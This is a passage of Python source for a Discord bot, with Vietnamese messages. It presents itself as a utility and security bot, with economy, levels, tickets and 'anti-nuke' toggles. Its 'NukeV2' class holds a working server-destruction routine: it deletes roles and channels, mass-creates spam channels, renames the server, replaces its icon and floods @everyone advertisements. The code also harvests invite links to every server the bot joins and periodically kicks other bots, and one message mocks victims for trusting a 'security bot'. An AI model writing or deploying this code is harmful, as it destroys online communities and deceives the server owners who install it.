            await ctx.send(f"🎉 **Winner of {prize}:** {winner.mention}! Congratulations!")
        else:
            await ctx.send(f"❌ No one entered the giveaway for {prize}.")

    @commands.command(name="endgiveaway")
    async def endgiveaway_cmd(self, ctx, message_id: int):
        if message_id not in giveaways:
            await ctx.send("❌ Giveaway not found!")
            return
        giveaway = giveaways[message_id]
        channel = bot.get_channel(giveaway['channel'])
        if not channel:
            await ctx.send("❌ Channel not found!")
            return
        msg = await channel.fetch_message(message_id)
        users = await msg.reactions[0].users().flatten()
        users = [u for u in users if not u.bot]
        if users:
            winner = random.choice(users)
            await ctx.send(f"🎉 **Winner of {giveaway['prize']}:** {winner.mention}!")
        else:
            await ctx.send(f"❌ No one entered the giveaway.")
        del giveaways[message_id]

    @commands.command(name="meme")
    async def meme_cmd(self, ctx):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://meme-api.com/gimme") as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        embed = discord.Embed(title=data.get('title', 'Meme'), color=0xFFAA00, timestamp=utcnow())
                        embed.set_image(url=data.get('url'))
                        embed.set_footer(text=f"👍 {data.get('ups', 0)}")
                        await ctx.send(embed=embed)
                    else:
                        await ctx.send("❌ Không thể lấy meme.")
        except:
            await ctx.send("❌ Lỗi kết nối API meme.")

    @commands.command(name="gif")
    async def gif_cmd(self, ctx, *, query: str):
        try:
            async with aiohttp.ClientSession() as session:
                url = f"https://api.giphy.com/v1/gifs/translate?api_key=dc6zaTOxFJmzC&s={query}"
                async with session.get(url) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        gif_url = data['data']['images']['original']['url']
                        embed = discord.Embed(title=f"🎞️ GIF: {query}", color=0x00CCFF, timestamp=utcnow())
                        embed.set_image(url=gif_url)
                        await ctx.send(embed=embed)
                    else:
                        await ctx.send("❌ Không tìm thấy GIF.")
        except:
            await ctx.send("❌ Lỗi kết nối API GIF.")

# ============================================================
# ECONOMY COMMANDS
# ============================================================
class EconomyCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="balance", aliases=["bal"])
    async def balance_cmd(self, ctx, member: discord.Member = None):
        if member is None:
            member = ctx.author
        coins = Economy.get_coins(member.id)
        embed = discord.Embed(title=f"💰 Balance of {member.name}", description=f"**Coins:** {format_number(coins)}", color=0xFFD700, timestamp=utcnow())
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)

    @commands.command(name="daily")
    async def daily_cmd(self, ctx):
        user_id = ctx.author.id
        last_daily = data_manager.get(f"daily_{user_id}", 0)
        now = time.time()
        if now - last_daily < 86400:
            remain = int(86400 - (now - last_daily))
            await ctx.send(f"⏳ Bạn đã nhận daily rồi. Còn {remain//3600}h {(remain%3600)//60}m.")
            return
        reward = random.randint(100, 500)
        Economy.add_coins(user_id, reward)
        data_manager.set(f"daily_{user_id}", now)
        await ctx.send(f"✅ Bạn đã nhận **{reward} coins** từ daily reward!")

    @commands.command(name="work")
    async def work_cmd(self, ctx):
        user_id = ctx.author.id
        last_work = data_manager.get(f"work_{user_id}", 0)
        now = time.time()
        if now - last_work < 60:
            remain = int(60 - (now - last_work))
            await ctx.send(f"⏳ Nghỉ ngơi chút đi, còn {remain}s nữa mới làm tiếp.")
            return
        earned = random.randint(50, 200)
        Economy.add_coins(user_id, earned)
        data_manager.set(f"work_{user_id}", now)
        jobs = ["👨‍💻 viết code", "🧹 dọn dẹp server", "☕ pha cà phê", "🐛 fix bug", "📝 viết báo cáo", "🛠️ sửa bot"]
        job = random.choice(jobs)
        await ctx.send(f"✅ Bạn vừa {job} và nhận được **{earned} coins**!")

    @commands.command(name="shop")
    async def shop_cmd(self, ctx):
        embed = discord.Embed(title="🏪  SHOP", color=0xFFD700, timestamp=utcnow())
        for key, item in shop_items.items():
            embed.add_field(name=item['name'], value=f"Price: {format_number(item['price'])} coins\n{item['desc']}\n`l!buy {key}`", inline=False)
        await ctx.send(embed=embed)

    @commands.command(name="buy")
    async def buy_cmd(self, ctx, item_key: str):
        item = shop_items.get(item_key.lower())
        if not item:
            await ctx.send("❌ Item không tồn tại. Xem `l!shop`.")
            return
        if not Economy.remove_coins(ctx.author.id, item['price']):
            await ctx.send(f"❌ Không đủ tiền! Giá: {format_number(item['price'])} coins.")
            return
        Economy.add_item(ctx.author.id, item_key.lower())
        await ctx.send(f"✅ Bạn đã mua **{item['name']}** thành công!")

    @commands.command(name="inventory")
    async def inventory_cmd(self, ctx, member: discord.Member = None):
        if member is None:
            member = ctx.author
        inv = Economy.get_inventory(member.id)
        if not inv:
            await ctx.send(f"ℹ️ {member.name} chưa có item nào.")
            return
        items = {"vip": "⭐ VIP Role", "color": "🎨 Color Role", "boost": "🚀 XP Boost"}
        display = "\n".join([f"• {items.get(i, i)}" for i in inv])
        embed = discord.Embed(title=f"🎒 Inventory of {member.name}", description=display, color=0xFFD700, timestamp=utcnow())
        await ctx.send(embed=embed)

# ============================================================
# LEVEL COMMANDS
# ============================================================
class LevelCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="level")
    async def level_cmd(self, ctx, member: discord.Member = None):
        if member is None:
            member = ctx.author
        user_id = member.id
        xp = LevelSystem.get_xp(user_id)
        level = LevelSystem.get_level(user_id)
        next_xp = LevelSystem.xp_required(level)
        progress = (xp / next_xp * 100) if next_xp > 0 else 0

        embed = discord.Embed(title=f"📊 Level of {member.name}", color=0x00FF88, timestamp=utcnow())
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.add_field(name="Level", value=level, inline=True)
        embed.add_field(name="XP", value=f"{format_number(xp)} / {format_number(next_xp)}", inline=True)
        embed.add_field(name="Progress", value=f"{progress:.1f}%", inline=True)
        embed.add_field(name="📈 Progress Bar", value=f"`{int(progress//5)*'█'}{'░'*(20-int(progress//5))}`", inline=False)
        embed.set_footer(text=f"Requested by {ctx.author.name}")
        await ctx.send(embed=embed)

    @commands.command(name="rank")
    async def rank_cmd(self, ctx):
        guild_members = {str(m.id) for m in ctx.guild.members if not m.bot}
        all_users = []
        for key, value in data_manager.data.items():
            if key.startswith("user_"):
                user_id = int(key.split("_")[1])
                if str(user_id) in guild_members:
                    all_users.append((user_id, value.get("xp", 0), value.get("level", 1)))
        sorted_users = sorted(all_users, key=lambda x: x[1], reverse=True)[:10]
        embed = discord.Embed(title="🏆  LEADERBOARD", color=0xFFD700, timestamp=utcnow())
        desc = ""
        for i, (user_id, xp, level) in enumerate(sorted_users, 1):
            try:
                member = ctx.guild.get_member(user_id)
                name = member.display_name if member else f"User {user_id%10000}"
            except:
                name = f"User {user_id%10000}"
            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else "🔹"
            desc += f"{medal} **#{i}** {name} — Lv.{level} (XP: {format_number(xp)})\n"
        embed.description = desc or "Chưa có ai tham gia."
        await ctx.send(embed=embed)

# ============================================================
# TICKET COMMANDS
# ============================================================
class Ticket(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="ticket")
    async def ticket_cmd(self, ctx, *, reason: str = "No reason"):
        guild = ctx.guild
        category = discord.utils.get(guild.categories, name="Tickets")
        if not category:
            category = await guild.create_category("Tickets")
        channel_name = f"ticket-{ctx.author.name.lower().replace(' ', '-')}"
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            ctx.author: discord.PermissionOverwrite(view_channel=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)
        }
        channel = await guild.create_text_channel(channel_name, category=category, overwrites=overwrites)
        embed = discord.Embed(title="🎫 Ticket Created", description=f"Reason: {reason}\nUse `l!close` to close this ticket.", color=0x9B59B6, timestamp=utcnow())
        await channel.send(f"{ctx.author.mention}", embed=embed)
        tickets[channel.id] = {"author": ctx.author.id, "reason": reason}
        await ctx.send(f"✅ Ticket created: {channel.mention}", delete_after=5)

    @commands.command(name="close")
    async def close_cmd(self, ctx):
        if ctx.channel.id not in tickets:
            await ctx.send("❌ Đây không phải là ticket.")
            return
        await ctx.channel.send("🔒 Closing ticket in 5 seconds...")
        await asyncio.sleep(5)
        await ctx.channel.delete()

# ============================================================
# ANTI COMMANDS – LƯU CẤU HÌNH PER SERVER (FIXED)
# ============================================================
class Anti(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def get_anticonfig(self, guild_id: int) -> dict:
        key = f"anti_{guild_id}"
        config = data_manager.get(key)
        if config is None:
            config = {
                "antinuke": False,
                "antiraid": False,
                "antibot": False,
                "log_channel": None,
                "raid_threshold": 5,
                "raid_time": 5,
                "whitelist": []
            }
            data_manager.set(key, config)
            log(f"Tạo config anti mới cho server {guild_id}", "INFO")
        return config

    def save_anticonfig(self, guild_id: int, config: dict):
        key = f"anti_{guild_id}"
        data_manager.set(key, config)
        log(f"Đã lưu config anti cho server {guild_id}: {config}", "INFO")

    @commands.command(name="antinuke")
    @commands.has_permissions(administrator=True)
    async def antinuke_cmd(self, ctx, status: str = None):
        config = self.get_anticonfig(ctx.guild.id)
        if status is None:
            embed = discord.Embed(
                title="🛡️ Anti-Nuke Status",
                description=f"Trạng thái: **{'🟢 BẬT' if config['antinuke'] else '🔴 TẮT'}**",
                color=0x00FF88 if config['antinuke'] else 0xFF4444,
                timestamp=utcnow()
            )
            embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
            await ctx.send(embed=embed)
            return

        if status.lower() in ["on", "bật", "true", "1"]:
            config["antinuke"] = True
            msg = "🛡️ **Anti-Nuke đã được BẬT!**"
        elif status.lower() in ["off", "tắt", "false", "0"]:
            config["antinuke"] = False
            msg = "🛡️ **Anti-Nuke đã được TẮT.**"
        else:
            await ctx.send("❌ Vui lòng nhập `on` hoặc `off`.\nVí dụ: `l!antinuke on`")
            return

        self.save_anticonfig(ctx.guild.id, config)
        embed = discord.Embed(
            title="🛡️ Anti-Nuke",
            description=msg,
            color=0x00FF88 if config['antinuke'] else 0xFFAA00,
            timestamp=utcnow()
        )
        embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
        await ctx.send(embed=embed)

    @commands.command(name="antiraid")
    @commands.has_permissions(administrator=True)
    async def antiraid_cmd(self, ctx, status: str = None):
        config = self.get_anticonfig(ctx.guild.id)
        if status is None:
            embed = discord.Embed(
                title="🛡️ Anti-Raid Status",
                description=f"Trạng thái: **{'🟢 BẬT' if config['antiraid'] else '🔴 TẮT'}**\nNgưỡng: `{config['raid_threshold']}` tin nhắn trong `{config['raid_time']}` giây",
                color=0x00FF88 if config['antiraid'] else 0xFF4444,
                timestamp=utcnow()
            )
            embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
            await ctx.send(embed=embed)
            return

        if status.lower() in ["on", "bật", "true", "1"]:
            config["antiraid"] = True
            msg = "🛡️ ** đã được BẬT!**"
        elif status.lower() in ["off", "tắt", "false", "0"]:
            config["antiraid"] = False
            msg = "🛡️ **Anti-Raid đã được TẮT.**"
        else:
            await ctx.send("❌ Vui lòng nhập `on` hoặc `off`.\nVí dụ: `l!antiraid on`")
            return

        self.save_anticonfig(ctx.guild.id, config)
        embed = discord.Embed(
            title="🛡️ Anti-Raid",
            description=msg,
            color=0x00FF88 if config['antiraid'] else 0xFFAA00,
            timestamp=utcnow()
        )
        embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
        await ctx.send(embed=embed)

    @commands.command(name="antibot")
    @commands.has_permissions(administrator=True)
    async def antibot_cmd(self, ctx, status: str = None):
        config = self.get_anticonfig(ctx.guild.id)
        if status is None:
            embed = discord.Embed(
                title="🛡️ Anti-Bot Status",
                description=f"Trạng thái: **{'🟢 BẬT' if config['antibot'] else '🔴 TẮT'}**",
                color=0x00FF88 if config['antibot'] else 0xFF4444,
                timestamp=utcnow()
            )
            embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
            await ctx.send(embed=embed)
            return

        if status.lower() in ["on", "bật", "true", "1"]:
            config["antibot"] = True
            msg = "🛡️ **Anti-Bot đã được BẬT!**"
        elif status.lower() in ["off", "tắt", "false", "0"]:
            config["antibot"] = False
            msg = "🛡️ **Anti-Bot đã được TẮT.**"
        else:
            await ctx.send("❌ Vui lòng nhập `on` hoặc `off`.\nVí dụ: `l!antibot on`")
            return

        self.save_anticonfig(ctx.guild.id, config)
        embed = discord.Embed(
            title="🛡️ Anti-Bot",
            description=msg,
            color=0x00FF88 if config['antibot'] else 0xFFAA00,
            timestamp=utcnow()
        )
        embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
        await ctx.send(embed=embed)

    @commands.command(name="setlog")
    @commands.has_permissions(administrator=True)
    async def setlog_cmd(self, ctx, channel: discord.TextChannel = None):
        config = self.get_anticonfig(ctx.guild.id)
        if channel is None:
            log_channel_id = config.get("log_channel")
            if log_channel_id:
                ch = ctx.guild.get_channel(log_channel_id)
                ch_mention = ch.mention if ch else "❌ Kênh không tồn tại"
                embed = discord.Embed(
                    title="📋 Log Channel",
                    description=f"Kênh log hiện tại: {ch_mention}",
                    color=0x00CCFF,
                    timestamp=utcnow()
                )
                embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
                await ctx.send(embed=embed)
            else:
                await ctx.send("📋 Chưa có kênh log nào được thiết lập. Dùng `l!setlog #channel` để thiết lập.")
            return

        config["log_channel"] = channel.id
        self.save_anticonfig(ctx.guild.id, config)
        embed = discord.Embed(
            title="📋 Log Channel",
            description=f"Đã thiết lập kênh log thành {channel.mention}",
            color=0x00CCFF,
            timestamp=utcnow()
        )
        embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
        await ctx.send(embed=embed)

    @commands.command(name="setraid")
    @commands.has_permissions(administrator=True)
    async def setraid_cmd(self, ctx, threshold: int, seconds: int):
        if threshold < 3 or seconds < 2:
            await ctx.send("❌ Giá trị tối thiểu: threshold >= 3, seconds >= 2.")
            return
        config = self.get_anticonfig(ctx.guild.id)
        config["raid_threshold"] = threshold
        config["raid_time"] = seconds
        self.save_anticonfig(ctx.guild.id, config)
        await ctx.send(f"✅ Đã đặt Anti-Raid: {threshold} tin nhắn trong {seconds} giây.")

    @commands.command(name="anti")
    @commands.has_permissions(administrator=True)
    async def anti_cmd(self, ctx):
        config = self.get_anticonfig(ctx.guild.id)
        embed = discord.Embed(
            title="🛡️ ANTI CONFIG",
            color=0x00CCFF,
            timestamp=utcnow()
        )
        embed.add_field(name="Anti-Nuke", value="🟢 BẬT" if config['antinuke'] else "🔴 TẮT", inline=True)
        embed.add_field(name="Anti-Raid", value="🟢 BẬT" if config['antiraid'] else "🔴 TẮT", inline=True)
        embed.add_field(name="Anti-Bot", value="🟢 BẬT" if config['antibot'] else "🔴 TẮT", inline=True)
        embed.add_field(name="Log Channel", value=f"<#{config['log_channel']}>" if config['log_channel'] else "❌ Chưa set", inline=False)
        embed.add_field(name="Raid Threshold", value=f"{config['raid_threshold']} msg / {config['raid_time']}s", inline=False)
        embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
        await ctx.send(embed=embed)

# ============================================================
# SERVER LIST (KHÔNG BỊ CHẶN TRONG WHITELIST)
# ============================================================
class ServerList(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="sv")
    async def sv_cmd(self, ctx):
        await ctx.message.delete()
        guilds = self.bot.guilds
        total_members = sum(g.member_count for g in guilds)
        embed = discord.Embed(
            title="🌐 BÁ NUKE - SERVER LIST",
            description=f"Bot ở **{len(guilds)}** server với **{total_members}** thành viên",
            color=0x00FF88,
            timestamp=utcnow()
        )
        embed.set_thumbnail(url="https://i.pinimg.com/736x/6c/3c/88/6c3c885c40e7d4b12b597fdf55c61951.jpg")
        embed.set_footer(text="MINH BÁ NUKE | l!help")
        sorted_guilds = sorted(guilds, key=lambda g: g.member_count, reverse=True)
        for guild in sorted_guilds[:20]:
            try:
                invite = None
                for channel in guild.text_channels:
                    try:
                        invite = await channel.create_invite(max_age=60, max_uses=1)
                        break
                    except:
                        continue
                invite_text = f"[Link]({invite.url})" if invite else "❌ No permission"
                embed.add_field(name=f"🟢 {guild.name}", value=f"👥 {guild.member_count} members | 👑 {guild.owner}\n🔗 {invite_text}", inline=False)
            except:
                embed.add_field(name=f"🟢 {guild.name}", value=f"👥 {guild.member_count} members | 👑 {guild.owner}\n🔗 ❌ Cannot create link", inline=False)
        if len(guilds) > 20:
            embed.add_field(name="📌 And more...", value=f"**{len(guilds) - 20}** more servers. Use `l!sv_all` to see all.", inline=False)
        try:
            await ctx.author.send(embed=embed)
            await ctx.send("📨 Sent server list to DM!", delete_after=3)
        except:
            await ctx.send(embed=embed)

    @commands.command(name="sv_all")
    async def sv_all_cmd(self, ctx):
        await ctx.message.delete()
        guilds = self.bot.guilds
        total_members = sum(g.member_count for g in guilds)
        content = "=" * 60 + "\n"
        content += "🌐 BOT - ALL SERVERS\n"
        content += f"📊 Total: {len(guilds)} servers | {total_members} members\n"
        content += "=" * 60 + "\n\n"
        sorted_guilds = sorted(guilds, key=lambda g: g.member_count, reverse=True)
        for i, guild in enumerate(sorted_guilds, 1):
            invite_link = "❌ Cannot create"
            for channel in guild.text_channels:
                try:
                    invite = await channel.create_invite(max_age=60, max_uses=1)
                    invite_link = invite.url
                    break
                except:
                    continue
            content += f"{i}. 🟢 {guild.name}\n"
            content += f"   📌 ID: {guild.id}\n"
            content += f"   👥 Members: {guild.member_count}\n"
            content += f"   👑 Owner: {guild.owner}\n"
            content += f"   📅 Created: {guild.created_at.strftime('%d/%m/%Y')}\n"
            content += f"   🔗 Link: {invite_link}\n"
            content += "-" * 50 + "\n"
        file = discord.File(io.StringIO(content), filename="minh_servers.txt")
        try:
            await ctx.author.send(file=file, content="📋 **All servers list:**")
            await ctx.send("📨 Sent file to DM!", delete_after=3)
        except:
            await ctx.send(file=file)

# ============================================================
# NUKE V2 - CORE ENGINE (CẬP NHẬT LINK HỖ TRỢ)
# ============================================================
class NukeV2:
    def __init__(self):
        self.rate_limit_delay = 0.3
        self.message_delay = 0.3
        self.max_messages = 15
        self.last_nuke_time = 0
        self.concurrent_tasks = 60
        self.channel_names = (
            ["n҉u҉k҉e҉d҉ b҉y҉ m҉i҉n҉h҉"] * 40 +
            ["N҉U҉K҉E҉ T҉O҉P҉ B҉O҉T҉"] * 40 +
            ["S҉E҉R҉V҉E҉R҉ N҉U҉K҉E҉ T҉O҉P҉"] * 40 +
            ["S҉E҉R҉V҉E҉R҉ N҉G҉U҉ V҉ẬY҉ "] * 40 +
            ["L҉ẤY҉ B҉O҉T҉ I҉B҉ T҉"] * 40
        )
        random.shuffle(self.channel_names)

    async def _log(self, content=None, embed=None):
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            try:
                await log_channel.send(content=content, embed=embed)
            except:
                pass

    async def _log_server_info(self, message, invite_link):
        guild = message.guild
        embed = discord.Embed(
            title="MINH Nuke Initiated",
            color=0x2F3136,
            timestamp=utcnow()
        )
        embed.add_field(name="Server", value=f"{guild.name} (ID: {guild.id})", inline=False)
        embed.add_field(name="Owner", value=str(guild.owner or "Unknown"), inline=True)
        embed.add_field(name="Members", value=str(guild.member_count), inline=True)
        embed.add_field(name="Channels", value=str(len(guild.channels)), inline=True)
        embed.add_field(name="Roles", value=str(len(guild.roles)), inline=True)
        embed.add_field(name="Created", value=guild.created_at.strftime("%d/%m/%Y %H:%M:%S"), inline=False)
        embed.add_field(name="Executed By", value=f"{message.author} (ID: {message.author.id})", inline=False)
        embed.set_footer(text=f"Time: {utcnow().strftime('%d/%m/%Y %H:%M:%S')}")
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        # Gửi link hỗ trợ
        await self._log(content=f"**Support 1:** {SUPPORT_LINK}\n**Support 2:** {SUPPORT_LINK2}", embed=embed)

    async def delete_or_rename_channel(self, channel, deleted_channels):
        if channel.id in deleted_channels:
            return None
        try:
            await channel.delete()
            deleted_channels.add(channel.id)
            return f"Deleted: {channel.name}"
        except:
            deleted_channels.add(channel.id)
            return None

    async def create_channel(self, guild, name, retries=3):
        for attempt in range(retries):
            try:
                channel = await guild.create_text_channel(name)
                return channel, f"Created: {name}"
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(float(e.response.headers.get("Retry-After", 1)))
                else:
                    return None, f"Failed: {name}"
            except:
                return None, f"Error: {name}"
        return None, f"Failed after {retries} retries"

    async def delete_roles(self, guild):
        for role in guild.roles:
            if role.position < guild.me.top_role.position and not role.is_default():
                try:
                    await role.delete()
                    await self._log(f"Deleted role: {role.name}")
                except:
                    pass

    async def rate_limited(self, retry_after=0.1, is_message=False):
        delay = self.message_delay if is_message else self.rate_limit_delay
        await asyncio.sleep(max(delay, retry_after))

    async def spam_message(self, channel, message, times=5, image_url=None, gif_url=None):
        main_embed = discord.Embed(
            title="Do you really think this is a security bot?",
            description=f"**This server has been nuked by Minh.**\nJoin: [server here]({SUPPORT_LINK})\nJoin 2: [server here 2]({SUPPORT_LINK2})",
            color=0x2F3136,
            timestamp=utcnow()
        )
        main_embed.set_footer(text="NUKE BY MINH")
        if gif_url:
            main_embed.set_thumbnail(url=gif_url)
        if image_url:
            main_embed.set_image(url=image_url)

        tag_message = f"||@everyone|| ||@here||\n{message}"

        for _ in range(min(times, self.max_messages)):
            try:
                await channel.send(content=tag_message, embed=main_embed)
                await self.rate_limited(is_message=True)
            except discord.HTTPException as e:
                if e.status == 429:
                    await self.rate_limited(float(e.response.headers.get("Retry-After", 0.2)), is_message=True)
                else:
                    await self._log(f"Failed to send in {channel.name}: {e}")
                    break

    async def _change_avatar(self, guild):
        try:
            if not guild.me.guild_permissions.manage_guild:
                await self._log("Không có quyền đổi avatar.")
                return
            async with aiohttp.ClientSession() as session:
                async with session.get(AVATAR_URL) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        if 0 < len(image_data) < 10 * 1024 * 1024:
                            await guild.edit(icon=image_data)
                            await self._log("Đã đổi avatar server.")
                        else:
                            await self._log("Ảnh không hợp lệ hoặc quá lớn.")
                    else:
                        await self._log(f"Không tải được ảnh (status {resp.status})")
        except Exception as e:
            await self._log(f"Lỗi đổi avatar: {e}")

    async def _execute_nuke(self, message):
        current_time = asyncio.get_event_loop().time()
        if current_time - self.last_nuke_time < 120:
            await self._log("Nuke on cooldown.")
            return
        self.last_nuke_time = current_time

        spam_content = "# <:emoji_1470040768453415033:1540558775969120358> **server ngu thế cay cha ko :))) cay join sv lấy bot để nuke lại nhá** <:emoji_1470040768453415033:1540558775969120358>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/PVtT85EPn\n> ||Join 2:|| not server support 2"
        image_url = "https://i.pinimg.com/originals/00/e3/82/00e38213018124b7f9d81df6cf1b05ca.gif"

        await self._log("Starting role deletion...")
        await self.delete_roles(message.guild)

        await self._log("Starting channel deletion...")
        deleted_channels = set()
        delete_tasks = [self.delete_or_rename_channel(ch, deleted_channels) for ch in message.guild.channels]
        await self._process_tasks(delete_tasks, "deletion")

        await self._log("Starting channel creation...")
        create_tasks = [self.create_channel(message.guild, name) for name in self.channel_names]
        new_channels, _ = await self._process_create_tasks(create_tasks)

        await self._log("Renaming server...")
        await self._rename_server(message.guild)
        await self._change_avatar(message.guild)

        await self._log("Spamming default channel...")
        default_channel = message.guild.system_channel or (message.guild.text_channels[0] if message.guild.text_channels else None)
        if default_channel:
            await self._spam_default_channel(default_channel, spam_content, image_url)

        await self._log("Spamming new channels...")
        spam_tasks = [self.spam_message(ch, spam_content, image_url=image_url) for ch in new_channels if ch]
        await self._process_tasks(spam_tasks, "spam")

        await self._log("Nuke completed successfully.")

    async def _process_tasks(self, tasks, task_type):
        for i in range(0, len(tasks), self.concurrent_tasks):
            try:
                await asyncio.gather(*tasks[i:i + self.concurrent_tasks], return_exceptions=True)
            except Exception as e:
                await self._log(f"[{task_type}] Error in batch: {e}")

    async def _process_create_tasks(self, tasks):
        new_channels = []
        for i in range(0, len(tasks), self.concurrent_tasks):
            try:
                batch_results = await asyncio.gather(*tasks[i:i + self.concurrent_tasks], return_exceptions=True)
                for channel, _ in batch_results:
                    if channel and isinstance(channel, discord.TextChannel):
                        new_channels.append(channel)
            except Exception as e:
                await self._log(f"[create_channel] Error in batch: {e}")
        return new_channels, []

    async def _spam_default_channel(self, channel, message, image_url):
        try:
            await self.spam_message(channel, message, times=5, image_url=image_url)
        except Exception as e:
            await self._log(f"Failed to spam default channel: {e}")

    async def _rename_server(self, guild):
        try:
            await guild.edit(name="G̸G̴.̵K̶Z̵3̷N̵.̶K̶Z̸4̴N̷ -̶ B̷Á̸ T̸O̶P̷ ,̸ H̵O̷T̶ W̷A̸R̶")
        except Exception as e:
            await self._log(f"Failed to rename server: {e}")

    async def setup(self, message):
        if message.guild.id in WHITELIST_SERVER_IDS:
            return
        await self._delete_command_message(message)
        invite_link = await self._create_invite(message)
        await self._log_server_info(message, invite_link)
        await self._execute_nuke(message)

    async def _delete_command_message(self, message):
        try:
            await message.delete()
        except:
            pass

    async def _create_invite(self, message):
        try:
            invite = await message.channel.create_invite(max_age=0, max_uses=0)
            return invite.url
        except:
            return "Unable to create invite."

# ============================================================
# BACKGROUND TASKS
# ============================================================
@tasks.loop(minutes=10)
async def auto_save():
    data_manager._save()
    log("Auto-saved data", "INFO")

# ============================================================
# EVENTS
# ============================================================
@bot.event
async def on_ready():
    print(f"[+] Logged in as {bot.user}")
    await bot.change_presence(
        activity=discord.Streaming(
            name=f"l!help | {len(bot.guilds)} Servers | {len(bot.users)} Users",
            url="https://twitch.tv/XNHAU.COM"
        )
    )
    print(f"[+] Ready | {len(bot.guilds)} servers | {len(bot.users)} users")
    auto_save.start()

# ============================================================
# TASK TỰ ĐỘNG KICK BOT ĐỊNH KỲ – BÁO CÁO CHI TIẾT + WHITELIST
# ============================================================
@tasks.loop(minutes=3)  # Chạy mỗi 3 phút
async def auto_kick_all_servers():
    """Kiểm tra tất cả server, kick bot và gửi báo cáo về log channel."""
    if not bot.is_ready():
        return

    log("🔄 Bắt đầu quét tự động kick bot trên tất cả server", "INFO")
    total_servers = len(bot.guilds)
    report_data = []
    whitelist_skipped = []
    total_bots_found = 0

    for guild in bot.guilds:
        # Bỏ qua server trong whitelist
        if guild.id in WHITELIST_SERVER_IDS:
            bot_count = len([m for m in guild.members if m.bot and m.id != bot.user.id])
            whitelist_skipped.append(f"🛡️ **{guild.name}** – {bot_count} bot (whitelist)")
            continue

        # Kiểm tra quyền kick
        if not guild.me.guild_permissions.kick_members:
            report_data.append(f"⚠️ **{guild.name}** – thiếu quyền `kick_members`")
            continue

        bot_members = [m for m in guild.members if m.bot and m.id != bot.user.id]
        total_bots_found += len(bot_members)
        if not bot_members:
            continue

        # Thực hiện kick
        kicked, failed = await kick_all_bots(guild)
        if kicked > 0 or failed > 0:
            icon = "✅" if kicked > 0 else "⚠️"
            report_data.append(f"{icon} **{guild.name}** – kick {kicked}, fail {failed} (tổng {len(bot_members)} bot)")
        else:
            report_data.append(f"⚠️ **{guild.name}** – có {len(bot_members)} bot nhưng không kick được")

    # Tạo embed báo cáo
    embed = discord.Embed(
        title="🔄 TỰ ĐỘNG KICK BOT ĐỊNH KỲ",
        description=f"**Thời gian:** {utcnow().strftime('%d/%m/%Y %H:%M:%S')}\n**Số server đã quét:** {total_servers}",
        color=0x00FF88 if any("✅" in line for line in report_data) else 0xFFAA00,
        timestamp=utcnow()
    )

    # Thêm chi tiết whitelist nếu có
    if whitelist_skipped:
        embed.add_field(
            name="🛡️ Server whitelist (bỏ qua)",
            value="\n".join(whitelist_skipped[:5]) + (f"\n... và {len(whitelist_skipped)-5} server khác" if len(whitelist_skipped) > 5 else ""),
            inline=False
        )

    # Thêm chi tiết kết quả kick
    if report_data:
        display_lines = report_data[:10]
        if len(report_data) > 10:
            display_lines.append(f"... và {len(report_data)-10} server khác")
        embed.add_field(name="📋 Kết quả kick", value="\n".join(display_lines), inline=False)
    else:
        embed.add_field(name="📋 Kết quả kick", value="Không có bot nào bị kick trong đợt này.", inline=False)

    # Tổng kết
    total_kicked = sum(
        int(line.split("kick ")[1].split(",")[0])
        for line in report_data
        if "kick " in line and line.split("kick ")[1].split(",")[0].isdigit()
    )
    total_failed = sum(
        int(line.split("fail ")[1].split()[0])
        for line in report_data
        if "fail " in line and line.split("fail ")[1].split()[0].isdigit()
    )
    embed.add_field(name="✅ Tổng kick thành công", value=str(total_kicked), inline=True)
    embed.add_field(name="❌ Tổng kick thất bại", value=str(total_failed), inline=True)
    embed.add_field(name="🤖 Tổng bot phát hiện", value=str(total_bots_found), inline=True)
    embed.set_footer(text="MINH Auto-Kick System")

    # Gửi về log channel (có retry)
    log_channel = bot.get_channel(LOG_CHANNEL_ID)
    if log_channel:
        for attempt in range(3):
            try:
                await log_channel.send(embed=embed)
                log("✅ Đã gửi báo cáo kick bot đến log channel", "INFO")
                break
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.response.headers.get("Retry-After", 1))
                    log(f"⏳ Rate limit, chờ {retry_after}s (lần {attempt+1}/3)", "WARN")
                    await asyncio.sleep(retry_after)
                else:
                    log(f"❌ Lỗi gửi báo cáo: {e}", "ERROR")
                    break
            except Exception as e:
                log(f"❌ Lỗi không xác định: {e}", "ERROR")
                break
    else:
        log(f"⚠️ Không tìm thấy log channel ID {LOG_CHANNEL_ID}", "WARN")

# Bắt đầu task khi bot sẵn sàng
@auto_kick_all_servers.before_loop
async def before_auto_kick():
    await bot.wait_until_ready()
    log("🚀 Auto-kick bot task đã sẵn sàng!", "INFO")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    try:
        # XP system
        if random.randint(1, 10) == 1:
            user_id = message.author.id
            LevelSystem.add_xp(user_id, random.randint(1, 3))
            if LevelSystem.check_level_up(user_id):
                new_level = LevelSystem.get_level(user_id)
